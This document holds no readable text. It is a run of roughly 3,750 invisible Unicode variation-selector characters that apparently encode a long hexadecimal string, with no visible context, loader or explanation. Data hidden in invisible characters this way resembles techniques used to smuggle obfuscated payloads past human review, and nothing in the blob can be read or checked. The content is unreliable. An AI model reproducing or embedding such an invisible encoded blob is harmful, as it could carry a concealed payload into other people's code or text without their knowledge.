󠄢󠄩󠄤󠄨󠄠󠄧󠄣󠅓󠄧󠄩󠄩󠅒󠅔󠅓󠄠󠄧󠄧󠄣󠄧󠅖󠄢󠅔󠅓󠄨󠄣󠅑󠄨󠅓󠄡󠄦󠄦󠄦󠄣󠄦󠅔󠄧󠄠󠅒󠅑󠄦󠄨󠄦󠄢󠅒󠄢󠄠󠅑󠄧󠅕󠅔󠄧󠄧󠄡󠅕󠅔󠅔󠄩󠄦󠅔󠅔󠄩󠄤󠄦󠅕󠅓󠅑󠅒󠄡󠄠󠄥󠄤󠄡󠅒󠄢󠄠󠄨󠄢󠅒󠄧󠄥󠄢󠄢󠅖󠄢󠄢󠄩󠅒󠄩󠄤󠄣󠄨󠅒󠅑󠅔󠅕󠅑󠄤󠅑󠄡󠄠󠄨󠅕󠅖󠄣󠄡󠄩󠄥󠄢󠅒󠅔󠄩󠄩󠅕󠅕󠄨󠅕󠄦󠄥󠄡󠄢󠅖󠅒󠅓󠄣󠄢󠅒󠄩󠄣󠅒󠄨󠅑󠅕󠄤󠅕󠅒󠄦󠄨󠄩󠄤󠄢󠄣󠄦󠅒󠄠󠅔󠄩󠄣󠅓󠅓󠄢󠅕󠅑󠅖󠄣󠅑󠅖󠄦󠄩󠄦󠄣󠄣󠅒󠅖󠅓󠅖󠄤󠅑󠄥󠄢󠅑󠄢󠅔󠄦󠄧󠄨󠄩󠄦󠅔󠅑󠅑󠄧󠄧󠄩󠅔󠅑󠄢󠅖󠄢󠄦󠄦󠅒󠄨󠄦󠄢󠄦󠅕󠅔󠄢󠅑󠅔󠄧󠅒󠄧󠅑󠅒󠅕󠅔󠅔󠄠󠄡󠄧󠅕󠄢󠄢󠅒󠄡󠅕󠅖󠄢󠅑󠄤󠄤󠅓󠄣󠄡󠅖󠄣󠅕󠄦󠄦󠅒󠄠󠄠󠅓󠄡󠅒󠅔󠅑󠅔󠄦󠅖󠄦󠅓󠄦󠅓󠅖󠅓󠅒󠄨󠅖󠅓󠄤󠄠󠄩󠅔󠅑󠅔󠅑󠄦󠄧󠅓󠄦󠅔󠄦󠄦󠄧󠄩󠅒󠄠󠅑󠅕󠄠󠄡󠄥󠅖󠄩󠄣󠅓󠅔󠄧󠅔󠄡󠄥󠅖󠄨󠄨󠄩󠄧󠅔󠄩󠄥󠅒󠅒󠅕󠅒󠄦󠄠󠄩󠄩󠄡󠄤󠄤󠄠󠅓󠄡󠄡󠄤󠄣󠄠󠄨󠄧󠅒󠄢󠄩󠄨󠅔󠄦󠅖󠅑󠄨󠅕󠄢󠅖󠄣󠄤󠅓󠅖󠅔󠄨󠅔󠄨󠄥󠄨󠅒󠄤󠅑󠄦󠄡󠄦󠄩󠄨󠄦󠅖󠄡󠅕󠄧󠅒󠅒󠄦󠄢󠅑󠄦󠄥󠄩󠄣󠄡󠄣󠅕󠄨󠄠󠅑󠄦󠄢󠄡󠄩󠅖󠅔󠄢󠄦󠄡󠅒󠄤󠄧󠅓󠄤󠅕󠅑󠄨󠄤󠄡󠅓󠅒󠄥󠅑󠄧󠄢󠄨󠄡󠄥󠄧󠅑󠄩󠄧󠅖󠅑󠄥󠄢󠄥󠅖󠅓󠅕󠅖󠅔󠅔󠄥󠄥󠄣󠄡󠄧󠅓󠅖󠅓󠄣󠄢󠄤󠄨󠄤󠄦󠄦󠄩󠅓󠄦󠅖󠄡󠄡󠄦󠄠󠅒󠄦󠄣󠄠󠄠󠄡󠄨󠅓󠄩󠄦󠄤󠄧󠅑󠄩󠄦󠄩󠅔󠄩󠄧󠄣󠅔󠅓󠄥󠄠󠅔󠄣󠄩󠅕󠅑󠄦󠅕󠄢󠄣󠅕󠅑󠄧󠅔󠄩󠄩󠄨󠄤󠄩󠄠󠄦󠄩󠄥󠄥󠅕󠄦󠅕󠄨󠄩󠅓󠄧󠄨󠄢󠄤󠄩󠄣󠄣󠄡󠄦󠅑󠄠󠅓󠅕󠅑󠅔󠅑󠄩󠄩󠅖󠅖󠄠󠅔󠄡󠅖󠅕󠄨󠄡󠄢󠅑󠄧󠄥󠅒󠄣󠄢󠄨󠄦󠄣󠄠󠄠󠄤󠄣󠅑󠄠󠅔󠄠󠄤󠅖󠄧󠄤󠄤󠄤󠄣󠄩󠄤󠄢󠄦󠄧󠄥󠄣󠅕󠅒󠄠󠄧󠄩󠄡󠅔󠄩󠄥󠄣󠅓󠄢󠅔󠅖󠄥󠄠󠄩󠅔󠅒󠄥󠄤󠄩󠅕󠄤󠅕󠅔󠅔󠄦󠄨󠄦󠅕󠄨󠄦󠅔󠅑󠅒󠄦󠅕󠅕󠅓󠅖󠄣󠄥󠄨󠄧󠄤󠄤󠅒󠅕󠅔󠅕󠄨󠄠󠄡󠅓󠄢󠄩󠅒󠅖󠅔󠄦󠅒󠅑󠅖󠄠󠅕󠅑󠅔󠅔󠄣󠄦󠄦󠄡󠅔󠅒󠄢󠄣󠄦󠄠󠅖󠄢󠅔󠄤󠄦󠄣󠄢󠄡󠄩󠅓󠄧󠅓󠅒󠅒󠄢󠄢󠅖󠅑󠅑󠅔󠄥󠅕󠅕󠅒󠄠󠅖󠅖󠅖󠄨󠄤󠅒󠄦󠅔󠄨󠄨󠄨󠄤󠄦󠄧󠅓󠄦󠄦󠅖󠅓󠅒󠅒󠄥󠄤󠅒󠄤󠄨󠄨󠄣󠄣󠅓󠄠󠅓󠄤󠄦󠅔󠄦󠄡󠄤󠅔󠄥󠄩󠅖󠅒󠄧󠄥󠄧󠅕󠅖󠄧󠄠󠅔󠄧󠅖󠅑󠅓󠅖󠅔󠅔󠅔󠄣󠄠󠄥󠅓󠅖󠄥󠅑󠅖󠄦󠅔󠄡󠄤󠄦󠄥󠄠󠄣󠅖󠅖󠄤󠅒󠄢󠄦󠄠󠄧󠄥󠅓󠄨󠅒󠄤󠄦󠅕󠄢󠅑󠅕󠄠󠅑󠅖󠄩󠄤󠄡󠄥󠄣󠅒󠄧󠄨󠅕󠄢󠅒󠅓󠄣󠄢󠅕󠄩󠄣󠄢󠅖󠄣󠅕󠄡󠅕󠄡󠄧󠄧󠄩󠅒󠅒󠄡󠄨󠅓󠄩󠄦󠄢󠄠󠄢󠅕󠅔󠅖󠄧󠅒󠅑󠅑󠅕󠅕󠅔󠅖󠅓󠄧󠄡󠅑󠄣󠄧󠄦󠄥󠄨󠄥󠄤󠅕󠅖󠄢󠄡󠄥󠅑󠄤󠅒󠄧󠅒󠄣󠄢󠅒󠅕󠄦󠄦󠅖󠄣󠅕󠄢󠅓󠄧󠅑󠅓󠅕󠄢󠄡󠄩󠄣󠄤󠄦󠄣󠄨󠄣󠄢󠄠󠅖󠄧󠄠󠄤󠄨󠅔󠅖󠄦󠄧󠅖󠄠󠅔󠅕󠅑󠅓󠅔󠄤󠅕󠄦󠄣󠄩󠄢󠄣󠄣󠄩󠄠󠄧󠄠󠅒󠅒󠄥󠅕󠄨󠄦󠄩󠅒󠅑󠄩󠄢󠅕󠅔󠄦󠄢󠄡󠅓󠄨󠄦󠅓󠄠󠄩󠄦󠄡󠄣󠄦󠄢󠄢󠅑󠄤󠅖󠅕󠄡󠄠󠅖󠄦󠅑󠄦󠄡󠄩󠄩󠅕󠅖󠄥󠅔󠅒󠅑󠅑󠄡󠄤󠅒󠄧󠄦󠅓󠅖󠄥󠅒󠄡󠄦󠄠󠄧󠅒󠄩󠅕󠄡󠅓󠅒󠅑󠄧󠄨󠅓󠅓󠅕󠄡󠄠󠅓󠅒󠅔󠅔󠄧󠄥󠅑󠅑󠅑󠅔󠅔󠄡󠄠󠅔󠅑󠄡󠄠󠄦󠅖󠅖󠅖󠄢󠄦󠄣󠅕󠄨󠅒󠄣󠄤󠄥󠄢󠅓󠄡󠄤󠄧󠄢󠅓󠄥󠅖󠅒󠅒󠅓󠄦󠄥󠄦󠄨󠄦󠄡󠄠󠄨󠄥󠄦󠄤󠅑󠄨󠅓󠅖󠅓󠄥󠄥󠄡󠅓󠄤󠄦󠄤󠅑󠅓󠅑󠅖󠅒󠅑󠄠󠅖󠄢󠅑󠄣󠅒󠄩󠄣󠄣󠄦󠅖󠅕󠄩󠄦󠄦󠅒󠅔󠄧󠄣󠄢󠄥󠄥󠄩󠄡󠄤󠅕󠅖󠅕󠄩󠄩󠄠󠄥󠅒󠅒󠄦󠄡󠄠󠄨󠅖󠄠󠄥󠄡󠄥󠄣󠅔󠅑󠄦󠄨󠄦󠄩󠄦󠄢󠄠󠄧󠄥󠄩󠄤󠄢󠄤󠄤󠅕󠄥󠄧󠄣󠄦󠅓󠅔󠅑󠅖󠄢󠄤󠄠󠄥󠄣󠄤󠄤󠅔󠄣󠅖󠄤󠄩󠄡󠄢󠄨󠅖󠄧󠅔󠅖󠄡󠄡󠅕󠄥󠅒󠄤󠄧󠄣󠄦󠅖󠄥󠄧󠅓󠅕󠄤󠅕󠅔󠅔󠄡󠄢󠄡󠄠󠄦󠄦󠄩󠅖󠅔󠅒󠄦󠄦󠄢󠄤󠅔󠄤󠅖󠅕󠅑󠄢󠄨󠄧󠄦󠅕󠅓󠅑󠅖󠄨󠅓󠄧󠄣󠄠󠄩󠄥󠄦󠅔󠄣󠄩󠅓󠄡󠅒󠅑󠄥󠄨󠄧󠄠󠅒󠄨󠅑󠅓󠅒󠅔󠅑󠄢󠄣󠄧󠄤󠄢󠅑󠄨󠄩󠄠󠄢󠅔󠅖󠅒󠅔󠅖󠄥󠅑󠄧󠄧󠄤󠄤󠄧󠅓󠄣󠄡󠅒󠄨󠄢󠅕󠄡󠅒󠄢󠅒󠄥󠄧󠄧󠄨󠅓󠄦󠄨󠄡󠄤󠅔󠄧󠅑󠄦󠄥󠅕󠅓󠅕󠅔󠅒󠄨󠄧󠅖󠅒󠄩󠄥󠄦󠄥󠅓󠅒󠅒󠄥󠄤󠅕󠄢󠄡󠅕󠄡󠄢󠄦󠄩󠅕󠄠󠄡󠄧󠄤󠄩󠄠󠄦󠄩󠄣󠄡󠅒󠄨󠄩󠄤󠄣󠄦󠄠󠄢󠄤󠄨󠄨󠄥󠄤󠅕󠄠󠄩󠄩󠅓󠅔󠄧󠄦󠄤󠄩󠄦󠅖󠅔󠄤󠄢󠅕󠄦󠄣󠄠󠄠󠄠󠄤󠄥󠄢󠄤󠅑󠄨󠄧󠄨󠄠󠅓󠄢󠅑󠄠󠄧󠄩󠄢󠄨󠄧󠅒󠄨󠅖󠅕󠅔󠅓󠄠󠄥󠅕󠅖󠄠󠅕󠄠󠄢󠄩󠄤󠅑󠄡󠄧󠄥󠄡󠄠󠄥󠄡󠅓󠄠󠅒󠄩󠄡󠅓󠅖󠄥󠄤󠄧󠅔󠄩󠅔󠄩󠄣󠄠󠄢󠅒󠄧󠅓󠄤󠄣󠄠󠄡󠅖󠄩󠄢󠄤󠄧󠄡󠅑󠅒󠄩󠄧󠄥󠄠󠅔󠅔󠄧󠄧󠄤󠅕󠄢󠅖󠅔󠄣󠄣󠅓󠄨󠄣󠄢󠄦󠅒󠄢󠅖󠄤󠄧󠄠󠄤󠄢󠄣󠄡󠄨󠄨󠄧󠄢󠄢󠄩󠄣󠅒󠅑󠄩󠅔󠄨󠄥󠄣󠄤󠅓󠄩󠅓󠄦󠄤󠄥󠅕󠄠󠄤󠄦󠄥󠄡󠅖󠅑󠄠󠅕󠄦󠅕󠄥󠄨󠄠󠅔󠄣󠅓󠄤󠄤󠄧󠅓󠄧󠅖󠄥󠄥󠄠󠄩󠅖󠄠󠅔󠄠󠄦󠄣󠄥󠄠󠅓󠄦󠅓󠄢󠅑󠄩󠄣󠄢󠅖󠅒󠄦󠅕󠄥󠄦󠄥󠄧󠄤󠅑󠅑󠄩󠅒󠅒󠄨󠄦󠄠󠄨󠄩󠄥󠄦󠄨󠅔󠅒󠄢󠄥󠄤󠄧󠅖󠄧󠅓󠅑󠅔󠅓󠄧󠄤󠄥󠄣󠅔󠄨󠄧󠄠󠄨󠅕󠅕󠄧󠄣󠅔󠄠󠄢󠄧󠄦󠅕󠅔󠄧󠄥󠅖󠄦󠄨󠄤󠅓󠄦󠅑󠄦󠅒󠄩󠄢󠄤󠄩󠅓󠅒󠄡󠅔󠄤󠄧󠅔󠅖󠄢󠄩󠄥󠄡󠅕󠄠󠅔󠅕󠅔󠄧󠅔󠄡󠅑󠄡󠄡󠅔󠄥󠅑󠄨󠅑󠄢󠄨󠅒󠄧󠄤󠄩󠄩󠄨󠄩󠅒󠄩󠄢󠄠󠅕󠅔󠄡󠄡󠅓󠄥󠄩󠄥󠄥󠄠󠄩󠄩󠅓󠄨󠄨󠄢󠅕󠄢󠄤󠄠󠄧󠄩󠄤󠅒󠄥󠅓󠄨󠄧󠄦󠄣󠄥󠅕󠅔󠅓󠄦󠄡󠅒󠄥󠄥󠄥󠄣󠅓󠄣󠅓󠄡󠄨󠅓󠅕󠄣󠅓󠄥󠅕󠄡󠅖󠅖󠅕󠄢󠅖󠄨󠅔󠄧󠄡󠄡󠄨󠅓󠅓󠄧󠄠󠄤󠄢󠄢󠄤󠄡󠄤󠄩󠄧󠄤󠄩󠄥󠄣󠅑󠄣󠄤󠅖󠄣󠅑󠅖󠄤󠄣󠅑󠅕󠄦󠄠󠄥󠅒󠄤󠅔󠄠󠄤󠄠󠅔󠅑󠄠󠄨󠄥󠄨󠄤󠄢󠄥󠄥󠅒󠄥󠄥󠄡󠄠󠅕󠄤󠅕󠄧󠅕󠄥󠅑󠄥󠄤󠄣󠅒󠅕󠅖󠄠󠅑󠅒󠄡󠅓󠄡󠄠󠄥󠅓󠅒󠄩󠄧󠄩󠄢󠅓󠄠󠄢󠄡󠄩󠄨󠄠󠄤󠅒󠅓󠄨󠄣󠅓󠄣󠄥󠄡󠅖󠅒󠄩󠄣󠅓󠄤󠄤󠄤󠄠󠄦󠄤󠄨󠄡󠄠󠄥󠄧󠄥󠄢󠄣󠄤󠄢󠄧󠄣󠅕󠄧󠅓󠄢󠄩󠄩󠅓󠄨󠄨󠄠󠄤󠄤󠄨󠅓󠅔󠅑󠄢󠄣󠄤󠄧󠄡󠄣󠅒󠄣󠄠󠄡󠄧󠄣󠅕󠅕󠄠󠄧󠅓󠄩󠅓󠅕󠄤󠄥󠅕󠄩󠅔󠅓󠄣󠄧󠄧󠅔󠄨󠄥󠄩󠄥󠄩󠄩󠅔󠄡󠄢󠄤󠄠󠄩󠄩󠄥󠅖󠄤󠅓󠄢󠄡󠅒󠄠󠅖󠄧󠄠󠅓󠅒󠄠󠄧󠄥󠄧󠄠󠄢󠄨󠅓󠅖󠅔󠅒󠅑󠄦󠅓󠅖󠄩󠄨󠅖󠄦󠄦󠄦󠅑󠄨󠄩󠄣󠅒󠄨󠄦󠄠󠅔󠄡󠄢󠅑󠅒󠄦󠄣󠄡󠄧󠅓󠅕󠅕󠅓󠅑󠄦󠄠󠅖󠅔󠄥󠄦󠄩󠄩󠄦󠄩󠄧󠄢󠅑󠄡󠄥󠅒󠄠󠅑󠄦󠄨󠅖󠅔󠄨󠅑󠅖󠅑󠄥󠅒󠅓󠅒󠄩󠄩󠄦󠄠󠅔󠄨󠄠󠄤󠄤󠄡󠅒󠄠󠄧󠅓󠄧󠅕󠄤󠄠󠄨󠄨󠄣󠄦󠅔󠄦󠄦󠄣󠅓󠄨󠄠󠄠󠄤󠅒󠄦󠅕󠄡󠄦󠅕󠄥󠄨󠄨󠅕󠄡󠅕󠄠󠄤󠄡󠅕󠄧󠄣󠅓󠄨󠄦󠅑󠄡󠅖󠄠󠅑󠅒󠅒󠄨󠅑󠅑󠄩󠅓󠄡󠄣󠄦󠄢󠅕󠄥󠄡󠄤󠅖󠄦󠅔󠄨󠅕󠅓󠄣󠄢󠅑󠄢󠄤󠄡󠅖󠄠󠅕󠄠󠅖󠄡󠄩󠄨󠄡󠄦󠄣󠅖󠄥󠅕󠅔󠅔󠅕󠄣󠄣󠄢󠄥󠅖󠄣󠄣󠅕󠄠󠄩󠅖󠄥󠄩󠄡󠅕󠄤󠄤󠄣󠄧󠄢󠄧󠅖󠄤󠅖󠄤󠄤󠄠󠄥󠄢󠄥󠄠󠄥󠅖󠄣󠅖󠄩󠅕󠄥󠄧󠄠󠄢󠄨󠄤󠄦󠄡󠅖󠅒󠄧󠄩󠅑󠄢󠅖󠄢󠄨󠄨󠄥󠅒󠄤󠅓󠅑󠄣󠄨󠅖󠄣󠄧󠅔󠄥󠄨󠅒󠄤󠅑󠄡󠅑󠅒󠄠󠄧󠄨󠅓󠄦󠅑󠅔󠄩󠅑󠄢󠄧󠅕󠄨󠄣󠅖󠄢󠅔󠅔󠄡󠅖󠅔󠄥󠅓󠄢󠄤󠅓󠄢󠅔󠄢󠄧󠄣󠅑󠄢󠅒󠄢󠄦󠄧󠄩󠅔󠅒󠄤󠄤󠅕󠄣󠅖󠄨󠅒󠄢󠅖󠄨󠄡󠄤󠄧󠄠󠄢󠄢󠄦󠄣󠄧󠅖󠄥󠅕󠄩󠅒󠅔󠄩󠄧󠅒󠅔󠅕󠄤󠄢󠅕󠄠󠄥󠄠󠅓󠅕󠄩󠅔󠄦󠅒󠄡󠅖󠄧󠅔󠄦󠄩󠄣󠅖󠄩󠄥󠄦󠅓󠅖󠄢󠅓󠅓󠄡󠄦󠅕󠄥󠅓󠄤󠄠󠄢󠅑󠅕󠄧󠄦󠄨󠄤󠄥󠄤󠄨󠄡󠄣󠅕󠄠󠅖󠄠󠄧󠄡󠅖󠅑󠄠󠅒󠅒󠅓󠅑󠄧󠄠󠅔󠅓󠄦󠄨󠅓󠄦󠅔󠄡󠄨󠅔󠅔󠄠󠄨󠄢󠄩󠄠󠄧󠄨󠅕󠅖󠅓󠅒󠅑󠅔󠄨󠅖󠅔󠅓󠄤󠄠󠄦󠄡󠄤󠄦󠄨󠄨󠄧󠄣󠅖󠄩󠅖󠄣󠅒󠅒󠅖󠄥󠄥󠅔󠅑󠄥󠄨󠄢󠅕󠄤󠄡󠅒󠄤󠅓󠅖󠄡󠅔󠅒󠄧󠄧󠅒󠅒󠄠󠅔󠄧󠄩󠄨󠅕󠄣󠅒󠄧󠄠󠅕󠄠󠄥󠅕󠄧󠄢󠅖󠅑󠅕󠅖󠄤󠅒󠄠󠄠󠅕󠄥󠄤󠅔󠄣󠅔󠅖󠅔󠄨󠅔󠄢󠅔󠄠󠄣󠅒󠄩󠅒󠅔󠄧󠄩󠄨󠄢󠅓󠅔󠄠󠄦󠄧󠄨󠅔󠄩󠅕󠄦󠄥󠄤󠅖󠅒󠅓󠅔󠅓󠄩󠄢󠄦󠅓󠄢󠄤󠅖󠄢󠅓󠄨󠄤󠄡󠄨󠄤󠄡󠅓󠅒󠄦󠅖󠅓󠅑󠄡󠅖󠅕󠄦󠅖󠅖󠅔󠅖󠄥󠄩󠅓󠄧󠅕󠄩󠄨󠅒󠄦󠄩󠅑󠄢󠅖󠅓󠄩󠄨󠄢󠄠󠅓󠄣󠅓󠅕󠅖󠄣󠄡󠅕󠅔󠄣󠅔󠅖󠅖󠄤󠄧󠅑󠄠󠅑󠄨󠄨󠄡󠄠󠅓󠄣󠄠󠅓󠄨󠅑󠄤󠅖󠅕󠄠󠅑󠅕󠅑󠄨󠄥󠅑󠄦󠄠󠄩󠄡󠅓󠅖󠄩󠄡󠄤󠅔󠄦󠄦󠄥󠄣󠄩󠄠󠅑󠅖󠄩󠄢󠄤󠅑󠅔󠄩󠄡󠄤󠄤󠅖󠅖󠄤󠄥󠄤󠄤󠄣󠄠󠄨󠄤󠅑󠅑󠄦󠄥󠄦󠄠󠄧󠄧󠄥󠄠󠅔󠅔󠄠󠅔󠄠󠄩󠄤󠄢󠄧󠄢󠄧󠅒󠄨󠄢󠄥󠅑󠄧󠅓󠅕󠄧󠅖󠄧󠅓󠄤󠄡󠄢󠄡󠄤󠅔󠄥󠄦󠅔󠄣󠅔󠄣󠅓󠄠󠅓󠄤󠄤󠄨󠄣󠄩󠄥󠅖󠄠󠄠󠅑󠄦󠄥󠅒󠄢󠅑󠄣󠅔󠅔󠄢󠄢󠄣󠄦󠄩󠄣󠄥󠄠󠅕󠄣󠅒󠄨󠅕󠅔󠄦󠄦󠅒󠄦󠅔󠅓󠅑󠄦󠅒󠅔󠅕󠅑󠄥󠄢󠅔󠅓󠅖󠅖󠄦󠄢󠄦󠅔󠄠󠄩󠄥󠅑󠅒󠄡󠄩󠄩󠄢󠄧󠄦󠄣󠅓󠅕󠅔󠄨󠄩󠅔󠄧󠄩󠄥󠄧󠅑󠅔󠄠󠄢󠄩󠄠󠄡󠄠󠄣󠄡󠅔󠅓󠄠󠅖󠅑󠄣󠄨󠅖󠄡󠄨󠄥󠄥󠅓󠅓󠄣󠄨󠄥󠅔󠄢󠄧󠅔󠄣󠄣󠄧󠄥󠄣󠄧󠄩󠅒󠄥󠄥󠄧󠄨󠄡󠅑󠅔󠅖󠄠󠅖󠅖󠄠󠅔󠄡󠄥󠄤󠄠󠅔󠄥󠄤󠄦󠄥󠅑󠄡󠄡󠄨󠅓󠄤󠄣󠄠󠄡󠄠󠅖󠄩󠄩󠄨󠄦󠄥󠄤󠄢󠅕󠄣󠄡󠄣󠅔󠄢󠄤󠄣󠄩󠄢󠅒󠄨󠄥󠅔󠅔󠅕󠄡󠄠󠄩󠅖󠄥󠄩󠄠󠄨󠅒󠄤󠄥󠄤󠄡󠄡󠄢󠄠󠄤󠄩󠅒󠄢󠄨󠄩󠄧󠄢󠄣󠅕󠅒󠄤󠄣󠄤󠄤󠄥󠅕󠄤󠄤󠅑󠅑󠄥󠅓󠄣󠅕󠅔󠄡󠄧󠄥󠄡󠄨󠄧󠄧󠅕󠅔󠅑󠄡󠅓󠄧󠅑󠄧󠅔󠅒󠅔󠄡󠅒󠄡󠄩󠄥󠅖󠄤󠄧󠄩󠅒󠄧󠄩󠅓󠅒󠄤󠅑󠄣󠄨󠅔󠄠󠄩󠄧󠅒󠄨󠅔󠄠󠄡󠄠󠄩󠄢󠅖󠅕󠄢󠅖󠅒󠄠󠄢󠅓󠄢󠅖󠅑󠄧󠄣󠄦󠅕󠄥󠄢󠄧󠄧󠅓󠄡󠄨󠄠󠅔󠅖󠄢󠄥󠄦󠅖󠅓󠄩󠄢󠅒󠅕󠄨󠄦󠄧󠄦󠄣󠄧󠄣󠄣󠄨󠄥󠅖󠄥󠄩󠅕󠅖󠄥󠄥󠅖󠅕󠄧󠄩󠄦󠅑󠅕󠅕󠅕󠄣󠄠󠄡󠅓󠅑󠄤󠄩󠄨󠄣󠄩󠅔󠄥󠄧󠅖󠅒󠄨󠄤󠅒󠄩󠄨󠄤󠅑󠅔󠅕󠄩󠄠󠅕󠄡󠄡󠄩󠄧󠄨󠅖󠄩󠄢󠅕󠄩󠅖󠄠󠅖󠄤󠅑󠄤󠄢󠄡󠄣󠄧󠅒󠄡󠅒󠅕󠄤󠄦󠄤󠄨󠅕󠄢󠄧󠅕󠄥󠅕󠄥󠅒󠄢󠅔󠄥󠄣󠄩󠅒󠅔󠅖󠅔󠅓󠅒󠄢󠅖󠄡󠄧󠅔󠅓󠄤󠅖󠄠󠅖󠄧󠅒󠄠󠅖󠄨󠄧󠅒󠄦󠄧󠅒󠅓󠄨󠅑󠅕󠄢󠄤󠄢󠄡󠅕󠄣󠅓󠅒󠄢󠄩󠅔󠄥󠅑󠅒󠅔󠅔󠄨󠅓󠅔󠄣󠅔󠄣󠅒󠄠󠅖󠄦󠄤󠄠󠅔󠅒󠄣󠄢󠄦󠄧󠅕󠄠󠅖󠅓󠄧󠄤󠅔󠄣󠄩󠄩󠄩󠄣󠄤󠄢󠄤󠄢󠄧󠄤󠄢󠄧󠄩󠄢󠄡󠄩󠅖󠄩󠄤󠄠󠄩󠄥󠅔󠄥󠄩󠄩󠄨󠄣󠅔󠄨󠅕󠄧󠄠󠅕󠅓󠅒󠅕󠅑󠄡󠅖󠅓󠄢󠅑󠄢󠅕󠄧󠄤󠄨󠅑󠅓󠄤󠄦󠄧󠄢󠄤󠅓󠅒󠅔󠅓󠄡󠅑󠅕󠄧󠄥󠅓󠄨󠄢󠄣󠄥󠅑󠅒󠄡󠅒󠅖󠄩󠄣󠅖󠄡󠄦󠅓󠅓󠅑󠄣󠅒󠄧󠅒󠅕󠄩󠅔󠅔󠄥󠄦󠄧󠄩󠄡󠅖󠄦󠄤󠄨󠅑󠄦󠅔󠄠󠄢󠅒󠅔󠄧󠅑󠅖󠅔󠅑󠄤󠄠󠄨󠄡󠅒󠄧󠄦󠄩󠄩󠄦󠄤󠄨󠄡󠄤󠄡󠄦󠄩󠄠󠄧󠅖󠄣󠄩󠄩󠄧󠄢󠄤󠄠󠄠󠅖󠄨󠅔󠄧󠅔󠄠󠄠󠄥󠄩󠄥󠄨󠄢󠄠󠄡󠅖󠄢󠄥󠄠󠄨󠄥󠄨󠅕󠅓󠄤󠅕󠄩󠄣󠅔󠅒󠄢󠄥󠄨󠄠󠄩󠅒󠅒󠅒󠄧󠅒󠅔󠄠󠅖󠄤󠄤󠅔󠅒󠄨󠄠󠄣󠄩󠄧󠅕󠄨󠅓󠅕󠅑󠅒󠄦󠅒󠅓󠅖󠅖󠄤󠄣󠅒󠅔󠄥󠄧󠄡󠄩󠅒󠅔󠄠󠅓󠄩󠅓󠄣󠄡󠅕󠅕󠄧󠄤󠄠󠅕󠅕󠄢󠄡󠄤󠄨󠄨󠄥󠄩󠄩󠅒󠄡󠄩󠄧󠄢󠅖󠅒󠄦󠅑󠄠󠄡󠅕󠅑󠅓󠄧󠅓󠅕󠅕󠅕󠄡󠄥󠄠󠄦󠅔󠄧󠄨󠄥󠄤󠄠󠄠󠄧󠄥󠅒󠅑󠅓󠄧󠅕󠅓󠄧󠄤󠄦󠄤󠄦󠅑󠄧󠄡󠅕󠅔󠄩󠄦󠄧󠅓󠄩󠄠󠄤󠄤󠄧󠄣󠅕󠄨󠄠󠅔󠄤󠅑󠅓󠄢󠄦󠄨󠄠󠄣󠄠󠄤󠅕󠅖󠅒󠄡󠄨󠅔󠄤󠄧󠄦󠄨󠄠󠄦󠄥󠄥󠄥󠄩󠄦󠄨󠅒󠅑󠅑󠅓󠄢󠄡󠄣󠄠󠅒󠄢󠄢󠄤󠅒󠄢󠄨󠄩󠄩󠄡󠄠󠅖󠄦󠄦󠄦󠄠󠅕󠅒󠄢󠄦󠅑󠅔󠄢󠅔󠅓󠄩󠄧󠄡󠅒󠄤󠄠󠅑󠄧󠄠󠄣󠅕󠄨󠄦󠄧󠄩󠄡󠄦󠄡󠅑󠅒󠅓󠄦󠅖󠅒󠄩󠄧󠄦󠄠󠄡󠄧󠅔󠄢󠅒󠄢󠄨󠄦󠅑󠅑󠅖󠄩󠄥󠄩󠅖󠅖󠄢󠄤󠅒󠄦󠄣󠄩󠄧󠄡󠄦󠄧󠅔󠅓󠄣󠅔󠅔󠅒󠄣󠄤󠄤󠅔󠄣󠄦󠄥󠅒󠄡󠅖󠅑󠅖󠅓󠅒󠄦󠄨󠄧󠄤󠄢󠄥󠄧󠅓󠅕󠄩󠄦󠅒󠅕󠄦󠅑󠅔󠅕󠄡󠄡󠅓󠅔󠄧󠄡󠄤󠅑󠄢󠄨󠄣󠅓󠅑󠅒󠄥󠅓󠅖󠄣󠄩󠅔󠄨󠅑󠅖󠅓󠅒󠄨󠄩󠄦󠄤󠄩󠅕󠄧󠅕󠅓󠄣󠄥󠄠󠄣󠄢󠅕󠄠󠄥󠅓󠅓󠄠󠄣󠄩󠅕󠄢󠄩󠄩󠅓󠄦󠄥󠄠󠄠󠅑󠄧󠄢󠄢󠄤󠄨󠅒󠄠󠄡󠄠󠄧󠅖󠄡󠅒󠄩󠄡󠄧󠄥󠄦󠄤󠄩󠄨󠄧󠄨󠄣󠅖󠅓󠅔󠅕󠅔󠄢󠄦󠄩󠅔󠄣󠅔󠄨󠄡󠄩󠅖󠄨󠄩󠅕󠄢󠄩󠅑󠅕󠅖󠅑󠄢󠄣󠄩󠅔󠅓󠅕󠄡󠅓󠅔󠄣󠄥󠅖󠄢󠄡󠄡󠄤󠅖󠄧󠅔󠅔󠄧󠅑󠅓󠅓󠅒󠄠󠄥󠄡󠄧󠄤󠄤󠄠󠄣󠄠󠅑󠄣󠄦󠄡󠄢󠄡󠅕󠅔󠄣󠄥󠄤󠄨󠄢󠄠󠄧󠅔󠄡󠄧󠅒󠄤󠄨󠄤󠄣󠅒󠅑󠄥󠅕󠄧󠄦󠄥󠄢󠅑󠅕󠄢󠅔󠄢󠄠󠄣󠄣󠅔󠄨󠅕󠅑󠄠󠄠󠄣󠅕󠅕󠅖󠅔󠄨󠄠󠄥󠄥󠅑󠄧󠅖󠄩󠅒󠄡󠄧󠄡󠅔󠄣󠄤󠄤󠄢󠅑󠅕󠅔󠄥󠅔󠅔󠄢󠅑󠅔󠅖󠅑󠄢󠄡󠅕󠄤󠄤󠄢󠅔󠄨󠄠󠄦󠄧󠅓󠄩󠄣󠅕󠄥󠄨󠅒󠄡󠄣󠄦󠄢󠄡󠄠󠅖󠅓󠅒󠄩󠄤󠄩󠅕󠄧󠄠󠄢󠄠󠄡󠄦󠅕󠄣󠅒󠅒󠅖󠄥󠄡󠄠󠅒󠅑󠅕󠄨󠄤󠄡󠅓󠅕󠅕󠄡󠄨󠄧󠅑󠄣󠄨󠅒󠅕󠄦󠄥󠄦󠅖󠅑󠅖󠅑󠄠󠄩󠄨󠄢󠄢󠄠󠄨󠄣󠄧󠄩󠄣󠅒󠄧󠄤󠅖󠄨󠅒󠄧󠅓󠅓󠄥󠄦󠄢󠅓󠄠󠅑󠅓󠄡󠄣󠅖󠅒󠄠󠄧󠄣󠄤󠅔󠄥󠅓󠄣󠄣󠄧󠅔󠄣󠄥󠅔󠄣󠄧󠅓󠅑󠄧󠅕󠄡󠅒󠄦󠄦󠄡󠅒󠄨󠄠󠅒󠄨